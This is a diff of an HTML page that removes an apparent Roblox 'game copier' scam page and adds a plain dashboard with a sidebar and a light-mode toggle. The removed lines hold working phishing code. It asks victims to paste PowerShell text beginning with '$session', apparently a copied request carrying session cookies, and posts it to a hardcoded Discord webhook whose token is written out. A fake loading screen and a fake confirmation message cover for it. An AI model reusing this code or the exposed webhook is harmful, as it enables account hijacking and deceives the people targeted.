@@ -3,14 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connecting to Server</title>
+    <title>RoProductos Dashboard</title>
     <style>
         :root {
             --primary: #1e293b; /* Dark Blue */
             --secondary: #475569; /* Light Gray-Blue */
             --accent: #38bdf8; /* Sky Blue */
-            --error: #ef4444; /* Red */
             --background: #0f172a; /* Navy Blue */
+            --light-mode-bg: #f1f5f9; /* Light Background */
+            --light-mode-text: #1e293b; /* Dark Text for Light Mode */
         }
 
         body {
@@ -19,63 +20,77 @@
             background: var(--background);
             color: white;
             display: flex;
-            justify-content: center;
-            align-items: center;
             height: 100vh;
             overflow: hidden;
+            transition: background 0.3s, color 0.3s;
         }
 
-        .grid {
-            text-align: center;
-            width: 100%;
-            max-width: 400px;
-            padding: 20px;
+        body.light-mode {
+            background: var(--light-mode-bg);
+            color: var(--light-mode-text);
+        }
+
+        .sidebar {
+            width: 20%;
             background: var(--primary);
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            box-shadow: 2px 0 5px rgba(0, 0, 0, 0.3);
         }
 
-        h1 {
+        .sidebar h2 {
+            color: var(--accent);
             margin-bottom: 20px;
+            text-align: center;
         }
 
-        input {
-            width: 100%;
-            padding: 10px;
-            font-size: 16px;
-            border: none;
-            border-radius: 5px;
-            margin-bottom: 20px;
+        .option {
+            margin-bottom: 15px;
+            padding: 10px 15px;
             background: var(--secondary);
-            color: white;
-        }
-
-        button {
-            width: 100%;
-            padding: 10px;
-            font-size: 16px;
-            border: none;
             border-radius: 5px;
             cursor: pointer;
-            background: var(--accent);
-            color: white;
             transition: background 0.3s;
+            text-align: center;
         }
 
-        button:hover {
+        .option:hover {
+            background: var(--accent);
+        }
+
+        .content {
+            width: 80%;
+            padding: 20px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .content .grid {
+            display: flex;
+            justify-content: space-between;
+            width: 80%;
+            gap: 20px;
+        }
+
+        .card {
+            flex: 1;
+            padding: 20px;
             background: var(--secondary);
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            transition: background 0.3s, color 0.3s;
         }
 
-        .error {
-            color: var(--error);
-            margin-top: 10px;
-            display: none;
+        .card.light-mode {
+            background: var(--light-mode-bg);
+            color: var(--light-mode-text);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
         }
 
-        .footer {
-            margin-top: 20px;
-            font-size: 14px;
-            color: var(--secondary);
+        .card h3 {
+            margin-bottom: 15px;
         }
 
         .notification {
@@ -97,212 +112,92 @@
             top: 20px;
         }
 
-        .discord-button {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: var(--accent);
-            color: white;
-            padding: 15px;
-            border-radius: 50%;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-            cursor: pointer;
-            transition: background 0.3s;
-            font-size: 18px;
-            font-weight: bold;
-            text-align: center;
-        }
-
-        .discord-button:hover {
-            background: var(--secondary);
-        }
-
-        #loading-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: var(--background);
+        .toggle {
             display: flex;
-            justify-content: center;
             align-items: center;
-            z-index: 1000;
-            flex-direction: column;
+            gap: 10px;
         }
 
-        .loading-dots {
-            display: flex;
-            justify-content: center;
-            margin-top: 10px;
-        }
-
-        .dot {
-            width: 8px;
-            height: 8px;
-            margin: 0 5px;
-            background: var(--accent);
-            border-radius: 50%;
-            animation: dot-animation 1s infinite;
-        }
-
-        .dot:nth-child(2) {
-            animation-delay: 0.2s;
-        }
-
-        .dot:nth-child(3) {
-            animation-delay: 0.4s;
-        }
-
-        @keyframes dot-animation {
-            0%, 100% {
-                opacity: 0.3;
-                transform: scale(1);
-            }
-            50% {
-                opacity: 1;
-                transform: scale(1.5);
-            }
+        .toggle input[type="checkbox"] {
+            transform: scale(1.5);
         }
     </style>
 </head>
 <body>
-    <div id="loading-screen">
-        <h2>Connecting to RoProductos Server</h2>
-        <div class="loading-dots">
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
+    <div class="sidebar">
+        <h2>RoProductos</h2>
+        <div class="option" onclick="showHomepage()">Homepage</div>
+        <div class="option" onclick="showSettings()">Settings</div>
+        <div class="option" onclick="toggleDropdown()">Apps</div>
+        <div id="dropdown" style="display: none; padding-left: 20px;">
+            <div class="option">Empty 1</div>
+            <div class="option">Empty 2</div>
+            <div class="option">Empty 3</div>
         </div>
     </div>
-
-    <div class="grid">
-        <h1>RoProductos - Best Game Copier</h1>
-        <input id="powershellCode" type="text" placeholder="Enter your PowerShell code" />
-        <input id="gameLink" type="text" placeholder="Enter the game link here" />
-        <input id="webhookLink" type="text" placeholder="Enter your Discord webhook link (To Receive results)" />
-        <button id="submitButton">Submit</button>
-        <p id="errorMessage" class="error"></p>
-        <p class="footer">Powered by RoProductos ©</p>
+    <div class="content">
+        <div id="homepage" class="grid" style="display: none;">
+            <div class="card">
+                <h3>About Us</h3>
+                <p>RoProductos provides the best tools for managing your Roblox assets seamlessly.</p>
+            </div>
+            <div class="card">
+                <h3>Contact Us</h3>
+                <p>Email: support@roproductos.com</p>
+                <p>Phone: +1-800-ROPRODUC</p>
+            </div>
+        </div>
+        <div id="settings" class="grid" style="display: none;">
+            <div class="card">
+                <h3>Settings</h3>
+                <div class="toggle">
+                    <label for="light-mode-toggle">Light Mode</label>
+                    <input id="light-mode-toggle" type="checkbox" onclick="toggleLightMode()">
+                </div>
+            </div>
+        </div>
     </div>
-
-    <div class="discord-button" onclick="redirectToDiscord()">Discord</div>
 
     <div id="notification" class="notification"></div>
 
     <script>
-    const submitButton = document.getElementById('submitButton');
-    const powershellCode = document.getElementById('powershellCode');
-    const gameLink = document.getElementById('gameLink');
-    const webhookLink = document.getElementById('webhookLink');
-    const errorMessage = document.getElementById('errorMessage');
-    const notification = document.getElementById('notification');
-    const loadingScreen = document.getElementById('loading-screen');
+        const notification = document.getElementById('notification');
+        const homepage = document.getElementById('homepage');
+        const settings = document.getElementById('settings');
+        const dropdown = document.getElementById('dropdown');
 
-    // Server-side webhook URL
-    const serverWebhook = "https://discord.com/api/webhooks/1315055547656962128/ZemZV2foK8_mL89BYarML8G9otCvxK29cX0JDyAPFWs9lfo9n1HVcx0hcL9I2cEYf09f";
-
-    const showNotification = (message) => {
-        notification.textContent = message;
-        notification.classList.add('show');
-        setTimeout(() => {
-            notification.classList.remove('show');
-        }, 3000);
-    };
-
-    const redirectToDiscord = () => {
-        window.location.href = 'https://discord.gg/4aPUmT6DTz';
-    };
-
-    const validateInputs = () => {
-        const code = powershellCode.value.trim();
-        const link = gameLink.value.trim();
-        const webhook = webhookLink.value.trim();
-
-        if (!code || !link || !webhook) {
-            showNotification('Please fill in all fields.');
-            return false;
-        }
-
-        if (!link.match(/^https:\/\/www\.roblox\.com\/games\/\d+\/\w+/)) {
-            showNotification('Invalid game link format.');
-            return false;
-        }
-
-        if (!webhook.match(/^https:\/\/discord\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_\-]+$/)) {
-            showNotification('Invalid Discord webhook URL.');
-            return false;
-        }
-
-        if (!code.startsWith('$session')) {
-            showNotification('Invalid PowerShell code.".');
-            return false;
-        }
-
-        return true;
-    };
-
-    const sendToServerWebhook = (fileContent) => {
-        const formData = new FormData();
-        formData.append('file', new Blob([fileContent], { type: 'text/plain' }), 'code.txt');
-        formData.append('payload_json', JSON.stringify({ content: 'The Server Received a Package' }));
-
-        return fetch(serverWebhook, { method: 'POST', body: formData })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Failed to send the file to the server.');
-                }
-            });
-    };
-
-    const sendUserNotification = (userWebhook) => {
-        const embedContent = {
-            embeds: [{
-                title: "Order Finished",
-                description: "Your order has been successfully submitted by our server, please click this [link](https://example.com) to get redirected to the website and receive the copy.",
-                color: 3447003
-            }]
+        const showNotification = (message) => {
+            notification.textContent = message;
+            notification.classList.add('show');
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
         };
 
-        return fetch(userWebhook, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(embedContent),
-        }).then(response => {
-            if (!response.ok) {
-                throw new Error('Failed to send the notification to the user.');
-            }
-        });
-    };
+        const showHomepage = () => {
+            homepage.style.display = 'flex';
+            settings.style.display = 'none';
+        };
 
-    submitButton.addEventListener('click', () => {
-        if (validateInputs()) {
-            const code = powershellCode.value.trim();
-            const userWebhook = webhookLink.value.trim();
+        const showSettings = () => {
+            homepage.style.display = 'none';
+            settings.style.display = 'flex';
+        };
 
-            // Send to server's webhook
-            sendToServerWebhook(code)
-                .then(() => {
-                    // Notify the user via their webhook
-                    return sendUserNotification(userWebhook);
-                })
-                .then(() => {
-                    showNotification('Order processed successfully.');
-                })
-                .catch(error => {
-                    console.error(error);
-                    showNotification('An error occurred while processing your order.');
-                });
-        }
-    });
+        const toggleDropdown = () => {
+            dropdown.style.display = dropdown.style.display === 'none' ? 'block' : 'none';
+        };
 
-    window.onload = () => {
-        document.title = 'Connecting to Server';
-        setTimeout(() => {
-            loadingScreen.style.display = 'none';
-            document.title = 'RoProductos - BestGameCopier';
-        }, 5000);
-    };
-</script>
+        const toggleLightMode = () => {
+            document.body.classList.toggle('light-mode');
+            const cards = document.querySelectorAll('.card');
+            cards.forEach(card => card.classList.toggle('light-mode'));
+        };
+
+        window.onload = () => {
+            showHomepage();
+            showNotification("Welcome to RoProductos!");
+        };
+    </script>
 </body>
 </html>
